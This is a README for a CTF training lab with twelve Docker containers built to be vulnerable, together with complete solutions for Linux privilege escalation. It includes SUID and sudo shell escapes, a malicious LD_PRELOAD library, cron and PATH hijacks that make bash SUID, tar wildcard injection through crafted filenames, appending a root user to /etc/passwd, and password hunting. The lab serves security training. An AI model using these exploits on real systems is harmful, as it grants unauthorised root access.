# Linux Privilege Escalation — CTF Lab

A collection of 12 Docker-based labs covering the most common Linux privesc
techniques found in CTF competitions and penetration tests.

Each container starts you as the low-privilege user **`wocsa`** (with a unique
password per lab — see the Dockerfile for each lab).
The goal of every lab is to **read `/root/flag.txt`**.

---

## Quick start

```bash
# Build all images (first run — takes a few minutes)
docker compose build

# Start all labs (SSH accessible on ports 30001–30012)
docker compose up -d

# Connect to a specific lab via SSH
ssh wocsa@localhost -p 30001

# Or build & run a single lab without docker compose
docker build -t privesc-lab-01 ./01-suid-find
docker run --rm -it privesc-lab-01
```

---

## Lab index

| Lab | Technique | Difficulty |
|-----|-----------|------------|
| 01 | SUID find | ⭐ Easy |
| 02 | SUID python3 | ⭐ Easy |
| 03 | SUID bash | ⭐ Easy |
| 04 | Sudo NOPASSWD → awk (GTFOBins) | ⭐ Easy |
| 05 | Sudo LD_PRELOAD via env_keep | ⭐⭐ Medium |
| 06 | Writable root cron script | ⭐⭐ Medium |
| 07 | Cron PATH hijacking | ⭐⭐ Medium |
| 08 | Cron wildcard injection (tar) | ⭐⭐ Medium |
| 09 | World-writable /etc/passwd | ⭐ Easy |
| 10 | Linux capabilities (cap_setuid) | ⭐⭐ Medium |
| 11 | Credential hunting & reuse | ⭐ Easy |
| 12 | SUID binary → PATH hijacking | ⭐⭐ Medium |

---

## Lab write-ups & solutions

### Lab 01 — SUID find

```bash
# Detection
find / -perm -4000 -type f 2>/dev/null   # reveals /usr/bin/find

# Exploitation
find . -exec /bin/sh -p \; -quit
cat /root/flag.txt
```

---

### Lab 02 — SUID python3

```bash
# Detection
find / -perm -4000 -type f 2>/dev/null   # reveals /usr/bin/python3

# Exploitation
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
cat /root/flag.txt
```

---

### Lab 03 — SUID bash

```bash
# Detection
ls -la /bin/bash    # shows -rwsr-xr-x

# Exploitation  (-p preserves the effective UID)
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 04 — Sudo NOPASSWD → awk

```bash
# Detection
sudo -l             # shows: (root) NOPASSWD: /usr/bin/awk

# Exploitation (GTFOBins)
sudo awk 'BEGIN {system("/bin/bash")}'
cat /root/flag.txt
```

---

### Lab 05 — Sudo LD_PRELOAD

```bash
# Detection
sudo -l             # shows env_keep+=LD_PRELOAD + NOPASSWD: /usr/bin/find

# Step 1: Write malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# Step 2: Compile
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# Step 3: Trigger
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find
cat /root/flag.txt
```

---

### Lab 06 — Writable root cron script

```bash
# Detection
cat /etc/cron.d/cleanup          # root runs /opt/cleanup.sh every minute
ls -la /opt/cleanup.sh           # -rwxrwxrwx  (world-writable!)

# Exploitation
echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
# Wait up to 60 seconds for cron to fire, then:
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 07 — Cron PATH hijacking

```bash
# Detection
cat /etc/cron.d/syscheck         # PATH=/tmp:/usr/local/...
cat /opt/syscheck.sh             # calls 'ps' without /usr/bin/ps

# Exploitation
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/ps
chmod +x /tmp/ps
# Wait up to 60 seconds, then:
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 08 — Cron wildcard injection (tar)

```bash
# Detection
cat /etc/cron.d/backup           # tar czf ... *  in /var/backups/uploads
ls -la /var/backups/uploads/     # writable by all

# Exploitation
cd /var/backups/uploads
echo 'chmod +s /bin/bash' > privesc.sh
printf '' > "--checkpoint=1"
printf '' > "--checkpoint-action=exec=sh privesc.sh"
# tar expands * → interprets filenames as flags
# Wait up to 60 seconds, then:
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 09 — World-writable /etc/passwd

```bash
# Detection
ls -la /etc/passwd               # -rw-rw-rw-  (world-writable!)

# Exploitation
# Generate a password hash
openssl passwd -1 -salt x hacked
# → $1$x$EUHpqIbMxQnhsZr5sTGlN/   (example)

# Append a new root-level user
echo 'r00t:$1$x$EUHpqIbMxQnhsZr5sTGlN/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch user
su r00t   # password: hacked
cat /root/flag.txt
```

---

### Lab 10 — Linux capabilities (cap_setuid)

```bash
# Detection (ls -la shows nothing — you need getcap)
getcap -r / 2>/dev/null
# → /usr/bin/python3.8 = cap_setuid+ep

# Exploitation
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/flag.txt
```

---

### Lab 11 — Credential hunting & reuse

```bash
# Discovery
grep -rn "password\|passwd\|DB_PASS" /var/www/ /opt/ 2>/dev/null
# or check bash history:
cat ~/.bash_history

# Found: Sup3rS3cr3t!2024

# Exploitation
su root   # password: Sup3rS3cr3t!2024
cat /root/flag.txt
```

---

### Lab 12 — SUID binary PATH hijacking

```bash
# Detection
find / -perm -4000 -type f 2>/dev/null   # finds /usr/local/bin/sysinfo
strings /usr/local/bin/sysinfo
# → "service --status-all"   (no absolute path!)

# Exploitation
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/sysinfo           # triggers, calls our fake 'service'
/bin/bash -p
cat /root/flag.txt
```

---

## Recommended enumeration flow (use inside any lab)

```bash
# 1. Who am I and what groups?
id && whoami

# 2. Sudo rights — highest value check
sudo -l

# 3. SUID/SGID binaries
find / -perm -4000 -o -perm -2000 2>/dev/null | grep -v proc

# 4. Capabilities
getcap -r / 2>/dev/null

# 5. Writable files and cron jobs
cat /etc/crontab /etc/cron.d/* 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# 6. Credential hunting
grep -rn "password\|passwd" /var/www/ /opt/ /home/ 2>/dev/null | head -20

# 7. Kernel version (for kernel exploit suggestions)
uname -a && cat /proc/version
```

## Adding more labs

Each lab follows the same pattern:

1. Create a new directory `NN-technique-name/`
2. Write a `Dockerfile` with:
   - A low-privilege `wocsa` user (with a unique password)
   - `/root/flag.txt` readable only by root
   - The vulnerability configured deliberately
   - A `/home/wocsa/README.txt` with a hint
3. For cron-based labs, include an `entrypoint.sh` that starts `cron` then `su`s to `wocsa`
4. Add the service to `docker-compose.yml`

---

*Built for security training and CTF preparation. Run only in isolated environments.*
